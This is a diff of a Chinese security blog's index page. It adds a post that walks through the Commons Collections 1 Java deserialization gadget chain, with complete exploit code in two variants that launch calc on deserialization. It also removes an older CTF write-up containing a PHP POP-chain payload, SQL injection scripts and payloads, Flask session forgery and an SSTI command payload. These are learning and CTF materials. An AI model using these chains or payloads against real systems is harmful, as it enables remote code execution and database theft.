@@ -172,6 +172,201 @@
         
 
 <div class="post">
+    <a href="/2023/07/22/CommonCollections1%E9%93%BE%20%E5%88%86%E6%9E%90/">
+        <h2 class="post-title">CommonCollections1链 分析</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/7/22
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><strong>本文记录java安全cc链的学习</strong></p>
+<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>首先要知道一些用到的类和接口<br><code>Transformer</code>接口</p>
+<p><img src="https://img-blog.csdnimg.cn/0bc2410045844d5986285a9f3a0f7515.png" alt="在这里插入图片描述"><br>里面有一个待实现的<code>transform</code>方法</p>
+<p><code>InvokerTransformer</code> 相当于重新实现了一个反射<br><img src="https://img-blog.csdnimg.cn/da2d087bc5db4818aa2f789fab3f2888.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/941f80dfa3c2483c9aa822c3937f434e.png" alt="在这里插入图片描述"><br>比如这样可以弹计算器<br><img src="https://img-blog.csdnimg.cn/3f19b14441f7432d8378a0dd2e176cb1.png" alt="在这里插入图片描述"></p>
+<p><code>ChainedTransformer</code><br><img src="https://img-blog.csdnimg.cn/ef7e59261f92453ba42568f3d0f8bea4.png" alt="在这里插入图片描述"><br>需要传一个Transformer数组<br>在其transform方法中可以按数组顺序逐一带入<br><code>ConstantTransformer</code><br>不管接收什么都返回一个常量 在构造函数赋值<br><code>TransformedMap</code><br><img src="https://img-blog.csdnimg.cn/a546475c6230477b83a0064ecd04d2da.png" alt="在这里插入图片描述"><br>接收一个map两个Transformer<br><img src="https://img-blog.csdnimg.cn/fb00f73169db46b28e5660a548a2c2a1.png" alt="在这里插入图片描述"></p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>我们最终想调用invokerTransformer的transform方法<br>那我们就要找谁调用了transform<br><img src="https://img-blog.csdnimg.cn/6e359bc9ce7348edb8f620a0cc6dfa4c.png" alt="在这里插入图片描述"><br>这里考虑<code>TransformedMap</code>类<br><img src="https://img-blog.csdnimg.cn/38949c5621ae46c3a05a3e3f5dd2acf1.png" alt="在这里插入图片描述"><br>然后看valueTransform是怎么来的<br>之前在看相关类的时候已经知道了 有一个Protected的构造函数 这里通过decorate方法得到的<br><img src="https://img-blog.csdnimg.cn/af955abcd33b41009d3fc656854a57f3.png" alt="在这里插入图片描述"></p>
+<p>那么我们先就如上的链子试试能不能连上<br><img src="https://img-blog.csdnimg.cn/a9efd0a046b74ea1ac0fd9dd1953e998.png"><br>继续跟链子</p>
+<p>我们发现<code>AbstractInputCheckedMapDecorator</code>类中的<code>MapEntry</code>类的<code>setValue</code>方法调用了<code>checkSetValue</code><br>且<code>TransformedMap</code>继承<code>AbstractInputCheckedMapDecorator</code><br><img src="https://img-blog.csdnimg.cn/7cd408f01af7493eb5c2e0539cd9b436.png" alt="在这里插入图片描述"><br>所以我们只需要遍历map就可以进setValue<br><img src="https://img-blog.csdnimg.cn/c99bec8f24334fe1a62b53db37a5dc4f.png" alt="在这里插入图片描述"><br>现在变成了 我们需要找到 一个地方遍历数组并调用了setValue<br>然后发现<code>AnnotationInvocationHandler</code>类中的<code>readObject</code>方法直接有调用<code>setValue</code></p>
+<p><img src="https://img-blog.csdnimg.cn/2a8a1518b5dc4cd3a9169d7a34245806.png" alt="在这里插入图片描述">继续观察 要想执行到setValue还需要一定的条件<br><img src="https://img-blog.csdnimg.cn/a2589f41abb546a99c64a1b33f4836a1.png" alt="在这里插入图片描述"></p>
+<p>首先是<code>memberType</code>非空<br>然后判断value是否是memberType的实例<br>并且我们知道Runtime是没有基础Serializable接口的我们需要用反射去拿Runtime的对象</p>
+<p>我们先考虑Runtime的问题,需要反射<br>拿InvokerTransformer实现就是这样</p>
+<pre><code class="java">        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;)
+                .transform(Runtime.class);
+        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;Runtime.class,null&#125;).transform(getRuntimeMethod);
+        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);
+</code></pre>
+<p>看起来很繁琐 我们可以用之前提到的ChainedTransformer来包裹<br>也就是这样</p>
+<pre><code class="c">        Transformer[] transformers = new Transformer[]&#123;
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;)
+                ,new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;)
+                ,new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        chainedTransformer.transform(Runtime.class);
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/6174fc5061794ddc9e8cf8105625299c.png" alt="在这里插入图片描述"><br>然后解决memberType的问题 首先是注解必须要有属性 然后map的key得是属性名<br>我们可以考虑用Target注解的value</p>
+<p>可以顺利进语句<br>现在我们只需要想办法控制<code>setValue</code>中的数据就可以了<br>考虑开始说的<code>ConstantTransformer</code> 把<code>Runtime.class</code>传给他就行<br>于是整个链子代码如下</p>
+<pre><code class="java">package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+
+public class App 
+&#123;
+    public static void main(String[] args) throws Exception &#123;
+
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class)
+                ,new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;)
+                ,new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;)
+                ,new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+//        chainedTransformer.transform(Runtime.class);
+
+        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+        hashMap.put(&quot;value&quot;,&quot;value&quot;);
+        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
+
+        Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+                .getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        Object obj = constructor.newInstance(Target.class,decoratedMap);
+        serialize(obj);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+    public static void serialize(Object object) throws Exception&#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(object);
+    &#125;
+    public static Object unSerialize(String path) throws Exception&#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+
+</code></pre>
+<h2 id="lazyMap"><a href="#lazyMap" class="headerlink" title="lazyMap"></a>lazyMap</h2><p>上面那个是一个版本 还有一个版本是基于lazyMap的<br>前面都一样 就<code>TransformedMap</code>改成了<code>LazyMap</code><br>我们发现<code>invoke</code>方法中调用了get方法<br>所以我们需要一个动态代理类去代理<code>AnnotationInvocationHandler</code>类 然后调用任意方法 就可以执行<code>invoke</code>方法</p>
+<p><img src="https://img-blog.csdnimg.cn/85412c3467d74a84b49d33cca0f5e8b0.png" alt="在这里插入图片描述"><br>要确保执行到<code>memberValues.get</code>我们不能调有参方法<br>然后只要<code>memberValues</code>是<code>LazyMap</code>的代理类就行<br>刚好 <code>AnnotationInvocationHandler</code> 实现了 <code>InvocationHandler</code>	<img src="https://img-blog.csdnimg.cn/7505191d306b42ebb957f8ca41e2f02e.png" alt="在这里插入图片描述"><br>那么现在的问题就是找无参方法 <img src="https://img-blog.csdnimg.cn/99335e043b7f45a0b1695b80b7c9ce5f.png" alt="在这里插入图片描述"><br><code>entrySet</code>就很好<br>于是链子如下</p>
+<pre><code class="java">package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class App 
+&#123;
+    public static void main(String[] args) throws Exception &#123;
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class)
+                ,new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;)
+                ,new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;)
+                ,new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Constructor annotationInvocationHandlerConstructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+                .getDeclaredConstructor(Class.class, Map.class);
+        annotationInvocationHandlerConstructor.setAccessible(true);
+
+
+
+        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+        LazyMap lzMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
+        InvocationHandler lzInvocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class, lzMap);
+        Map proxyLazyMap = (Map) Proxy.newProxyInstance(lzMap.getClass().getClassLoader(), lzMap.getClass().getInterfaces(), lzInvocationHandler);
+
+        Object obj = annotationInvocationHandlerConstructor.newInstance(Override.class, proxyLazyMap);
+        
+        serialize(obj);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+    public static void serialize(Object object) throws Exception&#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(object);
+    &#125;
+    public static Object unSerialize(String path) throws Exception&#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+
+</code></pre>
+<p>这里在反序列化的时候会抛<code>ClassCastException</code>的异常 不过不影响执行</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/java/" style="color: #00a596">java</a>
+        </span>
+        
+    </div>
+    <a href="/2023/07/22/CommonCollections1%E9%93%BE%20%E5%88%86%E6%9E%90/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2023/07/15/NSSCTF%E5%88%B7web(2)/">
         <h2 class="post-title">NSSCTF刷web(2)</h2>
     </a>
@@ -387,12 +582,12 @@ echo urlencode(serialize($pop));
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
         </span>
         
     </div>
@@ -613,22 +808,22 @@ echo urlencode(serialize($p)).&quot;\n&quot;;
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #ffa2c4">python</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+            <a href="/tags/python/" style="color: #00a596">python</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%89%8D%E7%AB%AF/" style="color: #03a9f4">前端</a>
+            <a href="/tags/%E5%89%8D%E7%AB%AF/" style="color: #00a596">前端</a>
         </span>
         
     </div>
@@ -908,7 +1103,7 @@ print(long_to_bytes(m))
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00a596">数学建模</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #03a9f4">数学建模</a>
         </span>
         
     </div>
@@ -1024,12 +1219,12 @@ print(long_to_bytes(pow(c,d,n)))
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00a596">数学建模</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ffa2c4">数学建模</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
         </span>
         
     </div>
@@ -1378,22 +1573,22 @@ print(long_to_bytes(pow(c,d,n)))
         
         <span class="tag">
             
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
             <a href="/tags/python/" style="color: #ff7d73">python</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00a596">开发语言</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
         </span>
         
     </div>
@@ -1487,12 +1682,12 @@ print(long_to_bytes(pow(c,d,a*g)))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #03a9f4">数学建模</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #00bcd4">数学建模</a>
         </span>
         
     </div>
@@ -1660,27 +1855,27 @@ print(hashlib.md5(flag.encode(&quot;utf-8&quot;)).hexdigest())
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
-        </span>
-        
-        <span class="tag">
-            
             <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ffa2c4">数学建模</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/php/" style="color: #00a596">php</a>
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ff7d73">数学建模</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/linux/" style="color: #ffa2c4">linux</a>
+            <a href="/tags/php/" style="color: #ffa2c4">php</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/linux/" style="color: #00bcd4">linux</a>
         </span>
         
     </div>
@@ -1957,431 +2152,21 @@ print(long_to_bytes(pow(c,d,n)))
         
         <span class="tag">
             
-            <a href="/tags/python/" style="color: #03a9f4">python</a>
+            <a href="/tags/python/" style="color: #00a596">python</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00bcd4">java</a>
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/javascript/" style="color: #00a596">javascript</a>
+            <a href="/tags/javascript/" style="color: #03a9f4">javascript</a>
         </span>
         
     </div>
     <a href="/2023/05/22/NSS%E5%91%A8%E5%B8%B8%E5%88%B7%E5%AF%86%E7%A0%81(1)/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/05/16/2023%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9B%20%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E8%B5%9B%E5%89%8D%E6%A8%A1%E6%8B%9F%E9%A2%98%E9%83%A8%E5%88%86wp/">
-        <h2 class="post-title">2023宁波市赛 天一永安杯赛前模拟题部分wp</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/5/16
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>进hint.php</p>
-<p>伪协议读index.php</p>
-<pre><code class="php">&lt;?php
-class Tiger&#123;
-    public $string;
-    protected $var;// 恶意参数
-    public function __construct($var)&#123;
-        $this-&gt;var = $var;
-    &#125;
-    public function __toString()&#123;
-        return $this-&gt;string;
-    &#125;
-    public function boss($value)&#123;// 0
-        @eval($value);
-    &#125;
-    public function __invoke()&#123;// 1
-        $this-&gt;boss($this-&gt;var);
-    &#125;
-&#125;
-
-class Lion&#123;
-    public $tail;
-    public function __construct()&#123;
-        $this-&gt;tail = array();
-    &#125;
-    public function __get($value)&#123;
-        $function = $this-&gt;tail;
-        return $function(); // 2
-    &#125;
-&#125;
-
-
-class Monkey&#123;
-    public $head;
-    public $hand;
-    public function __construct($here=&quot;Zoo&quot;)&#123;
-        $this-&gt;head = $here;
-        echo &quot;Welcome to &quot;.$this-&gt;head.&quot;&lt;br&gt;&quot;;
-    &#125;
-    public function __wakeup()&#123;//0
-        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;head)) &#123;
-            echo &quot;hacker&quot;;
-            $this-&gt;source = &quot;index.php&quot;;
-        &#125;
-    &#125;
-&#125;
-
-class Elephant&#123;
-    public $nose;
-    public $nice;
-    public function __construct($nice=&quot;nice&quot;)&#123;// 4
-        $this-&gt;nice = $nice;
-        echo $nice;
-    &#125;
-    public function __toString()&#123;
-        return $this-&gt;nice-&gt;nose;// 3
-    &#125;
-&#125;
-
-if(isset($_POST[&#39;zoo&#39;]))&#123;
-    @unserialize($_POST[&#39;zoo&#39;]);
-&#125;
-$pop = new Monkey();
-$E = new Elephant();
-$pop -&gt; head = $E;
-$L = new Lion();
-$L -&gt; tail = new Tiger(&quot;system(&#39;tac /f14g&#39;);&quot;);
-$E -&gt; nice = $L;
-$a = urlencode(serialize($pop));
-echo &quot;\n&quot;;
-echo $a;
-// unserialize(urldecode($a));
-
-//O%3A6%3A%22Monkey%22%3A2%3A%7Bs%3A4%3A%22head%22%3BO%3A8%3A%22Elephant%22%3A2%3A%7Bs%3A4%3A%22nose%22%3BN%3Bs%3A4%3A%22nice%22%3BO%3A4%3A%22Lion%22%3A1%3A%7Bs%3A4%3A%22tail%22%3BO%3A5%3A%22Tiger%22%3A2%3A%7Bs%3A6%3A%22string%22%3BN%3Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A20%3A%22system%28%27tac+%2Ff14g%27%29%3B%22%3B%7D%7D%7Ds%3A4%3A%22hand%22%3BN%3B%7D
-</code></pre>
-<h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p>注释都给过滤了,我一开始没注意,费老半天劲不知道在干什么</p>
-<p>然后直接闭合1’or 1&#x3D;’1可以回显</p>
-<p>这里一开始就想着盲注了,后来才发现union也可以</p>
-<pre><code class="python">import string
-import requests
-url = &#39;http://040bac98a927037e.node.nsctf.cn/index.php?id=1&#39;
-dic = string.ascii_letters+string.digits+&#39;&#125;&#123;-,_&#39;
-xxx = &#39;&#39;
-for i in range(1,666):
-    
-    flag = True
-    print(&quot;正在注入第&#123;&#125;位&quot;.format(i))
-    for j in dic:
-        # payload = &quot;&#39;/**/%26%26if(substr(database(),&#123;&#125;,1)=binary&#39;&#123;&#125;&#39;,1,0)%26%26/**/1=/**/&#39;1&quot;.format(i,j)
-        payload = &quot;&#39;/**/%26%26if(substr((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics_with_buffer),&#123;&#125;,1)=binary&#39;&#123;&#125;&#39;,1,0)%26%26/**/1=/**/&#39;1&quot;.format(i,j)
-        res = requests.get(url=url+payload)
-        if &#39;的人名字叫bob&#39; in res.text:
-            xxx += j
-            flag = False
-    print(xxx)
-    if flag:
-        print(xxx)
-        break
-
-    # 数据库 web2
-    # 表 atable flag users sys_config
-</code></pre>
-<p>过滤information了</p>
-<p>得无列名注入</p>
-<pre><code class="sql">-1&#39;union/**/select/**/1,(select/**/`1`/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/flag)a/**/limit/**/1,1),3&#39;
-</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/542a56c3392f40fe543a5d6915763027.png" alt="image-20230512203144268"></p>
-<p>读账号</p>
-<pre><code class="sql">-1&#39;union/**/select/**/1,(select/**/`1`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3&#39; 
-</code></pre>
-<p>读密码</p>
-<pre><code class="sql">-1&#39;union/**/select/**/1,(select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3&#39;
-</code></pre>
-<p>进login.php登录就拿到flag了</p>
-<h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><p>一开始以为ssti,试半天发现怎样都不能注入</p>
-<p>扫目录</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/10ace8a6ee383402d7bd5232bb818b52.png" alt="image-20230508204705520"></p>
-<pre><code class="python">source in /source&quot;
-        return rsp
-
-
-@app.route(&#39;/source&#39;)
-def source():
-    f = open(__file__, &#39;r&#39;)
-    rsp = f.read()
-    f.close()
-    return rsp[rsp.index(&#39;source&#39;):]
-
-
-@app.route(&#39;/admin&#39;)
-def admin_handler():
-    try:
-        role = session.get(&#39;role&#39;)
-        if not isinstance(role, dict):
-            raise Exception
-    except Exception:
-        return &#39;~~~~~~hacker!&#39;
-    if role.get(&#39;is_admin&#39;) == 1:
-        flag = role.get(&#39;flag&#39;) or &#39;admin&#39;
-        flag = filter(flag)
-        message = &quot;%s, I hope you have a good time!your flag is &quot; % flag
-        return render_template_string(message)
-    else:
-        return &quot;I don&#39;t know you&quot;
-
-
-if __name__ == &#39;__main__&#39;:
-    app.run(&#39;0.0.0.0&#39;, port=80)
-
-</code></pre>
-<p>进admin session伪造</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/9549d474c8b37f33f395f09cfcbdaa10.png" alt="image-20230508204809301"></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/cbde36a7934a143ae2dec4f160b4ecac.png" alt="image-20230508205422970"></p>
-<p><code>eyJyb2xlIjp7ImlzX2FkbWluIjoxLCJuYW1lIjoidGVzdCIsInNlY3JldF9rZXkiOiJWR2d4YzBCdmJtVWhjMlZEY21WMElRPT0ifX0.ZFjw1A.zbhScChV5emlcs855_qO2RnToVQ</code></p>
-<p>然后此处存在ssti</p>
-<p>payload如下</p>
-<img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202305082144662.png" alt="image-20230508214448619"  />
-
-<pre><code>eyJyb2xlIjp7ImlzX2FkbWluIjoxLCJmbGFnIjoie3tsaXBzdW0uX19nbG9iYWxzX18ub3MucG9wZW4oJ2NkIC4uO2NhdCBmKicpLnJlYWQoKX19In19.ZFj8cQ._J4XAqO3oSWZR9tf9q-p2MDJCzY
-</code></pre>
-<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ezcal"><a href="#ezcal" class="headerlink" title="ezcal"></a>ezcal</h2><p>rsa数学推导</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/6bc596191cef93ffc28e2900ac471609.png" alt="image-20230508210500587"></p>
-<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="Empathy"><a href="#Empathy" class="headerlink" title="Empathy"></a>Empathy</h2><p>核心代码</p>
-<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
-&#123;
-  char Str2[64]; // [rsp+20h] [rbp-60h] BYREF
-  char Str1[256]; // [rsp+60h] [rbp-20h] BYREF
-  char Str[256]; // [rsp+160h] [rbp+E0h] BYREF
-  int v7; // [rsp+260h] [rbp+1E0h]
-  int k; // [rsp+264h] [rbp+1E4h]
-  int j; // [rsp+268h] [rbp+1E8h]
-  int i; // [rsp+26Ch] [rbp+1ECh]
-
-  sub_401D30(argc, argv, envp);
-  puts(&amp;Buffer);
-  printf(&amp;Format);
-  memset(Str, 0, sizeof(Str));
-  memset(Str1, 0, sizeof(Str1));
-  scanf(&quot;%s&quot;, Str);
-  v7 = strlen(Str);
-  if ( v7 != 38 )
-  &#123;
-    printf(&amp;byte_40504D);
-    exit(0);
-  &#125;
-  for ( i = 0; i &lt; v7; ++i )
-    Str[i] = ~Str[i];
-  for ( j = 0; j &lt;= 99; ++j )
-  &#123;
-    sub_401550(&amp;Str[(j + 5) % v7], &amp;Str[(j + 2) % v7]);
-    sub_401550(&amp;Str[(j + 1) % v7], &amp;Str[(j + 7) % v7]);
-    sub_401550(&amp;Str[(j + 3) % v7], &amp;Str[(j + 10) % v7]);
-    sub_401550(&amp;Str[(j + 8) % v7], &amp;Str[(j + 9) % v7]);
-  &#125;
-  sub_401588(Str, Str1, 0i64);
-  Str2[0] = 51;
-  Str2[1] = 102;
-  Str2[2] = 39;
-  Str2[3] = 60;
-  Str2[4] = 39;
-  Str2[5] = 45;
-  Str2[6] = 40;
-  Str2[7] = 18;
-  Str2[8] = 36;
-  Str2[9] = 107;
-  Str2[10] = 109;
-  Str2[11] = 17;
-  Str2[12] = 36;
-  Str2[13] = 61;
-  Str2[14] = 113;
-  Str2[15] = 25;
-  Str2[16] = 48;
-  Str2[17] = 4;
-  Str2[18] = 39;
-  Str2[19] = 4;
-  Str2[20] = 36;
-  Str2[21] = 19;
-  Str2[22] = 43;
-  Str2[23] = 60;
-  Str2[24] = 38;
-  Str2[25] = 45;
-  Str2[26] = 109;
-  Str2[27] = 21;
-  Str2[28] = 51;
-  Str2[29] = 107;
-  Str2[30] = 104;
-  Str2[31] = 61;
-  Str2[32] = 38;
-  Str2[33] = 45;
-  Str2[34] = 63;
-  Str2[35] = 7;
-  Str2[36] = 39;
-  Str2[37] = 107;
-  Str2[38] = 105;
-  Str2[39] = 18;
-  Str2[40] = 53;
-  Str2[41] = 106;
-  Str2[42] = 18;
-  Str2[43] = 21;
-  Str2[44] = 51;
-  Str2[45] = 7;
-  Str2[46] = 13;
-  Str2[47] = 59;
-  Str2[48] = 51;
-  Str2[49] = 45;
-  Str2[50] = 7;
-  Str2[51] = 99;
-  for ( k = 0; k &lt;= 51; ++k )
-    Str2[k] ^= 0x5Eu;
-  if ( !strcmp(Str1, Str2) )
-    printf(&amp;byte_405060);
-  else
-    printf(&amp;byte_405081);
-  return 0;
-&#125;
